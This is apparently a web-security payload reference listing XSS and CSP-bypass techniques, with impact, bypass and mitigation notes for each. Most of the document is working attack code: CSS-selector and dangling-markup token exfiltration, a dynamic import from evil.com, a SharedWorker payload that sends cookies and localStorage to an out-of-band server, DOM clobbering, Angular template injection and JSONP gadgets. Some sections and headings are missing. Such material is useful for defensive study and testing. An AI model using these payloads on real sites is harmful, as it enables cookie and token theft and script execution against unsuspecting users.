A. CSS Injection for Data Exfiltration (No JS Required)
CSS INJECTIONNO JS
01
<style> /* CSS attribute selector exfiltration — reads CSRF token character by character */ input[name="csrf"][value^="a"] { background: url('http://localhost:5001/oob?c=a'); } input[name="csrf"][value^="b"] { background: url('http://localhost:5001/oob?c=b'); } /* ... repeat for all possible first characters ... */ /* Then refine: input[value^="aX"] for each second char, etc. */ </style>
ImpactData exfiltration without JavaScript — works even with strict CSP that blocks all script TechniqueCSS attribute selector [attr^="prefix"] triggers background-image load — acts as an oracle for token values BypassesCSP that blocks all JavaScript (script-src 'none') but allows style injection and external image loads Stopped byCSP style-src 'nonce-…' blocking injected styles; CSP img-src 'self' blocking external image loads; Trusted Types (doesn't help here — no DOM sink) NoteEach CSS rule fires a network request only when the selector matches. Attacker iterates through all possible character values, observing which requests arrive at their server. Builds up the token one character at a time. Requires many requests but no JS at all — defeats "block all scripts" defenses.
CSS INJECTIONDANGLING MARKUP
02
<!-- Dangling markup — inject an unclosed <img src=" that swallows subsequent HTML --> <img src='http://localhost:5001/oob?data= <!-- If injection point is in the middle of the page, everything until the next quote character becomes part of the src URL — including CSRF tokens in forms --> <!-- Example: injection lands before: --> <form><input name="csrf" value="SECRET_TOKEN"></form> <!-- The browser fetches: http://localhost:5001/oob?data=[everything including SECRET_TOKEN] -->
ImpactToken exfiltration without script execution — works with strict CSP TechniqueUnclosed attribute absorbs subsequent HTML including secrets; browser fetches the URL containing the secret BypassesCSP blocking all scripts (no JS needed); filters that check for closing > after the injection Stopped byCSP img-src 'self'; output encoding (encodes the opening quote, closing the attribute properly); Content-Security-Policy disallowing external images OriginDocumented by Google Project Zero. "Dangling markup injection" is a technique for data exfiltration when HTML injection is possible but script execution is blocked. The unclosed quote causes the browser to treat page content as a URL attribute value.
B. Dynamic import() and Module Loading
DYNAMIC IMPORTCSP BYPASS
03
<img src=x onerror=" // Dynamic import() loads an ES module import('//evil.com/xss.mjs').then(m => m.default()); "> // xss.mjs content: export default function() { alert(document.domain); }
ImpactLoads and executes external JS as an ES module BypassesSome CSP configurations that allow script-src but don't account for dynamic import() as a separate fetch type Stopped byCSP script-src applies to import() too in modern browsers; blocking external script loads; Trusted Types NoteDynamic import() is subject to CSP script-src in Chrome 66+ and Firefox 68+. However, some WAF rules check for "script" tag injection and miss import() as a dynamic code-loading vector entirely. Important for internal threat models.
BLOB URLCSP BYPASS
04
<img src=x onerror=" // Create a blob: URL containing JS, then import it const code = 'export default () => alert(document.domain)'; const blob = new Blob([code], {type: 'application/javascript'}); const url = URL.createObjectURL(blob); import(url).then(m => m.default()); ">
ImpactCreates and loads JS from a blob: URL — no external request needed BypassesCSP rules that only restrict external URLs; if script-src allows blob: (some CSP configs do to support Web Workers) Stopped byCSP script-src without blob:; Trusted Types; preventing XSS Noteblob: URLs are same-origin. If a CSP says script-src 'self' blob: (common for apps using Web Workers with inline code), blob: import is unrestricted. This is why adding blob: to script-src should be done carefully.

D. Trusted Types Bypass Attempts
TRUSTED TYPESBYPASS ATTEMPT
07
// Trusted Types bypass via overly permissive createHTML policy: const policy = trustedTypes.createPolicy('default', { createHTML: (s) => s // ← VULNERABLE: passes any string through }); // Attacker payload: element.innerHTML = policy.createHTML('<img src=x onerror=alert(1)>'); // Trusted Types "passes" — but the policy is the vulnerability, not TT itself // Lesson: TT is a security boundary enforcement tool, not a sanitizer. // The policy MUST call DOMPurify or equivalent. "createHTML: s => s" defeats TT entirely.
ImpactTrusted Types with a pass-through policy provides no actual security benefit NoteThis isn't a bypass of Trusted Types itself — it's a misconfiguration. TT enforces that createHTML is called. It doesn't enforce that createHTML sanitizes. A pass-through policy is like putting a lock on a door and giving everyone the key. Correct usagecreateHTML: (s) => DOMPurify.sanitize(s) — the policy must contain the real defense OriginCommon mistake when adopting Trusted Types. Teams add TT compliance without understanding that the security comes from the policy body, not from the TT enforcement itself.

08
<!-- DOM Clobbering — HTML injection that doesn't need event handlers --> <!-- Overwrites global variables by exploiting named element access --> <form id="config"><input id="apiUrl" value="javascript:alert(1)"></form> <!-- Vulnerable app code: --> <script> // Developer expects config to be an object imported elsewhere // But DOM clobbering makes window.config point to the form element // And config.apiUrl returns the input element, whose toString() is its value const url = config.apiUrl; // => returns input element location.href = url; // => navigates to javascript:alert(1) </script>
ImpactCode execution without event handlers or script tags — overrides JS globals via HTML element naming MechanismHTML elements with id= are accessible as global window properties; forms with id= and named inputs create object-property chains BypassesSanitizers that allow id attributes; DOMPurify (older versions — now blocks by default); Trusted Types (different sink — location.href not innerHTML) Stopped byDOMPurify 2.x+ with SANITIZE_DOM enabled; sanitizers stripping id attributes; Trusted Types createScriptURL; validating URL scheme before navigation OriginDOM Clobbering — a technique exploiting the legacy HTML behaviour where named elements become global variables. id=config makes window.config point to the element. Documented extensively by PortSwigger research team.
E. WebAssembly & Worker Vectors
WASMOBFUSCATION
09
<img src=x onerror=" // WebAssembly as obfuscation layer — WAF sees no recognisable JS keywords // The WASM module calls a JS import: window.alert const wasm = new Uint8Array([ 0,97,115,109,1,0,0,0, // WASM magic + version // ... (abbreviated) module that imports 'alert' from JS env and calls it ]); // In practice: compile Rust/C to WASM that calls back into JS // WAF: sees binary data, not 'alert' or 'document' WebAssembly.instantiate(wasm, {env: {alert: window.alert}}) .then(m => m.instance.exports.run()); ">
ImpactObfuscation of payload logic in binary format — no recognisable JS keywords BypassesContent scanners that look for "alert", "document", "cookie" in text; static analysis tools that don't inspect WASM imports Stopped byCSP script-src without unsafe-eval (WebAssembly.instantiate uses eval-like semantics in some models); Trusted Types; preventing XSS NoteWASM payloads are largely theoretical in XSS context — they're more complex to deliver than standard JS and provide no additional capability. Their interest is as an obfuscation layer that defeats text-based content scanning. Practically: CSP blocks WASM in eval mode.
SHARED WORKERCROSS-TAB
10
<img src=x onerror=" // SharedWorker persists across all tabs of the same origin const workerCode = \` const ports = []; self.onconnect = e => { const port = e.ports[0]; ports.push(port); port.onmessage = msg => { // Broadcast to all connected tabs ports.forEach(p => p.postMessage({stolen: msg.data})); // Exfil fetch('http://localhost:5001/oob?d='+encodeURIComponent(JSON.stringify(msg.data))); }; }; \`; const blob = new Blob([workerCode], {type:'application/javascript'}); const sw = new SharedWorker(URL.createObjectURL(blob)); sw.port.onmessage = e => console.log('from worker:', e.data); sw.port.start(); // Now exfiltrate data by posting to sw.port sw.port.postMessage({cookie: document.cookie, ls: JSON.stringify(localStorage)}); ">
ImpactSharedWorker persists across all tabs — a single XSS payload infects the entire browser session for that origin BypassesTab-specific defenses; page reload (worker survives) Stopped byCSP worker-src blocking blob:; closing all tabs (SharedWorker dies when no tabs connect); preventing XSS NoteSharedWorkers live at the origin level — they're shared across all tabs. One XSS payload can plant a SharedWorker that intercepts communication from all tabs. Survives page navigation within the origin. Cleared only when all tabs close or the worker is explicitly terminated.

// Client-Side Template Injection (CSTI) — Angular 1.x expression injection // If user input is placed in an Angular template context: {{constructor.constructor('alert(1)')()}} // Vue 2 equivalent: {{_c.constructor('alert(1)')()}} // React does NOT have this issue — JSX expressions are escaped by default // Angular 2+ uses strict sandboxing — harder to bypass // Classic Angular 1.x sandbox bypass: {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
ImpactCode execution via framework expression evaluation — template engine evaluates user input as code BypassesXSS filters (the payload uses {{ }} not <script>); HTML sanitizers (the payload has no HTML tags) Stopped byNever placing user input in Angular/template expression contexts; using modern Angular (2+) with strict content security; CSP OriginCSTI differs from XSS: the payload doesn't inject HTML — it injects into a template expression context. JSONPCSP BYPASS
12
// CSP allowlists *.googleapis.com for Google APIs // googleapis.com has JSONP endpoints usable as script gadgets: // https://accounts.google.com/o/oauth2/revoke?callback=alert(1) // Returns: alert(1)({"error":"invalid_token",...}) // If CSP allows: script-src *.googleapis.com // Inject: <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script> // Browser fetches from allowlisted domain → executes alert(1) // Other common JSONP gadgets on allowlisted CDNs: // *.cloudflare.com, *.jquery.com, *.bootstrapcdn.com — check for JSONP endpoints
ImpactCSP bypass via trusted domain with JSONP endpoint — CSP host allowlists are fundamentally fragile BypassesCSP that allowlists full domains rather than specific paths; any CSP with *.googleapis.com in script-src Stopped byNonce-based CSP (allowlisting by nonce, not domain); removing *.googleapis.com from script-src; strict-dynamic CSP OriginDocumented by Sebastian Lekies, Krzysztof Kotowicz, Eduardo Vela. Any trusted domain that has a JSONP endpoint becomes a CSP bypass gadget. *.googleapis.com, *.google.com, *.gstatic.com all have known JSONP endpoints. This is why host-based CSP is considered weak compared to nonce/hash-based.
